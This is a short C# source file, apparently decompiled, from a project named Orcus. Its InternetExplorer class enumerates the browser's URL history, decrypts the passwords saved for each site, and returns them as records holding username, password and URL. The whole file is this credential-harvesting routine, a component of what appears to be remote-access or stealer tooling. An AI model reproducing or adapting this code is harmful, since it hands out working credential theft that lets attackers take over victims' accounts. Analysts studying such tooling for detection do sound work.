using System;
using System.Collections.Generic;
using Orcus.Commands.Passwords.Applications.InternetExplorer.Native;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.InternetExplorer;

internal class InternetExplorer : IPasswordRecovery
{
	private const string ApplicationName = "Internet Explorer";

	public IEnumerable<RecoveredPassword> GetPasswords()
	{
		using ExplorerUrlHistory urlHistory = new ExplorerUrlHistory();
		List<string[]> dataList = new List<string[]>();
		ExplorerUrlHistory.STATURLEnumerator enumerator = urlHistory.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				STATURL entry = enumerator.Current;
				if (!CryptoApi.DecryptIePassword(entry.UrlString, dataList))
				{
					continue;
				}
				foreach (string[] item in dataList)
				{
					RecoveredPassword val = new RecoveredPassword();
					val.set_UserName(item[0]);
					val.set_Password(item[1]);
					val.set_Field1(entry.UrlString);
					val.set_Application("Internet Explorer");
					val.set_PasswordType((PasswordType)0);
					yield return val;
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				disposable.Dispose();
			}
		}
	}
}
